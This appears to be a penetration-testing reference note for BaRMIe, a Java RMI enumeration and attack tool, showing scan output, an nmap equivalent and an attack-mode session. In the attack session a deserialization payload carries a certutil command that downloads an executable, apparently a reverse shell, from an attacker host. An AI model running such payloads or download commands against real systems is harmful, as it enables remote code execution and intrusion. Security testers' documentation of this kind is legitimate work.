---
tags: [java,rmi]
---
# BaRMIe

=== Info
- **Description**: Java RMI enumeration and attack tool
- Version tested: v1.01
- Review date: 30/07/2019
- [Source](https://github.com/NickstaDB/BaRMIe)
- [Rawsec Inventory](https://inventory.raw.pm/tools.html#BaRMIe)
===

## Example of execution

```
java -jar BaRMIe_v1.01.jar -enum 10.0.0.1 1100

  ▄▄▄▄    ▄▄▄       ██▀███   ███▄ ▄███▓ ██▓▓█████
 ▓█████▄ ▒████▄    ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓██▒▓█   ▀
 ▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██    ▓██░▒██▒▒███
 ▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▒██    ▒██ ░██░▒▓█  ▄
 ░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒   ░██▒░██░░▒████▒
 ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▓  ░░ ▒░ ░
 ▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░  ░      ░ ▒ ░ ░ ░  ░
  ░    ░   ░   ▒     ░░   ░ ░      ░    ▒ ░   ░
  ░            ░  ░   ░            ░    ░     ░  ░
       ░                                     v1.0
             Java RMI enumeration tool.
               Written by Nicky Bloor (@NickstaDB)

Warning: BaRMIe was written to aid security professionals in identifying the
         insecure use of RMI services on systems which the user has prior
         permission to attack. BaRMIe must be used in accordance with all
         relevant laws. Failure to do so could lead to your prosecution.
         The developers assume no liability and are not responsible for any
         misuse or damage caused by this program.

Scanning 1 target(s) for objects exposed via an RMI registry...

[-] An exception occurred during the PassThroughProxyThread main loop.
        java.net.SocketException: Socket closed
[-] An exception occurred during the ReplyDataCapturingProxyThread main loop.
        java.net.SocketException: Socket closed
RMI Registry at 10.0.0.1:1100
Objects exposed: 1
Object 1
  Name: creamtec/ajaxswing/JVMFactory
  Endpoint: 10.0.0.1:49161
  Classes: 3
    Class 1
      Classname: java.rmi.server.RemoteStub
    Class 2
      Classname: java.rmi.server.RemoteObject
    Class 3
      Classname: com.creamtec.ajaxswing.core.JVMFactory_Stub

1 potential attacks identified (+++ = more reliable)
[---] Java RMI registry illegal bind deserialization

0 deserialization gadgets found on leaked CLASSPATH
[~] Gadgets may still be present despite CLASSPATH not being leaked

Successfully scanned 1 target(s) for objects exposed via RMI.
```

## Equivalent with nmap

```
sudo nmap -sSVC --script rmi-dumpregistry -p 1100 10.0.0.1
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-02 01:16 CEST
Nmap scan report for 10.0.0.1
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
1100/tcp open  java-rmi Java RMI Registry
| rmi-dumpregistry: 
|   creamtec/ajaxswing/JVMFactory
|     com.creamtec.ajaxswing.core.JVMFactory_Stub
|     @10.0.0.1:49161
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
MAC Address: 00:50:56:93:08:41 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
```

## Attack mode

Add `-attack` option.

```
Deserialization payloads for: 10.0.0.1:1100
 1) Apache Commons Collections 3.1, 3.2, 3.2.1
 2) Apache Commons Collections 4.0-alpha1, 4.0
 3) Apache Groovy 1.7-beta-1 to 2.4.0-beta-4
 4) Apache Groovy 2.4.0-rc1 to 2.4.3
 5) JBoss Interceptors API
 6) ROME 0.5 to 1.0
 7) ROME 1.5 to 1.7.3
 8) Mozilla Rhino 1.7r2
 9) Mozilla Rhino 1.7r2 for Java 1.4
 10) Mozilla Rhino 1.7r3
 11) Mozilla Rhino 1.7r3 for Java 1.4
 12) Mozilla Rhino 1.7r4 and 1.7r5
 13) Mozilla Rhino 1.7r6, 1.7r7, and 1.7.7.1
 a) Try all available deserialization payloads
Select a payload to use (b to back up, q to quit): 1

Enter an OS command to execute: certutil.exe -urlcache -split -f http://10.11.0.75:8000/rewin.exe rewin.exe
[~] Starting RMI registry proxy...
[+] Proxy started
[~] Getting proxied RMI Registry reference...
[~] Calling bind(PAYLOAD, null)...

[~] Attack completed but success could not be verified.

Remediation advice (if attack was successful):
  [Java] Update to Java 6u141, Java 7u131, Java 8u121, JRockit R28.3.13 or greater.
  [Apache Commons Collections] Update to Apache Commons Collections 3.2.2 or greater.

Attack: Java RMI registry illegal bind deserialization [---]

Java version 6u131, 7u121, 8u121 and below, and JRockit R28.3.12 and below do not validate the types of the parameter to the RMI Registry.bind() method at the server side prior to deserializing them. This enables us to inject a deserialization payload at the network level by replacing either parameter to bind() with a payload object.
```
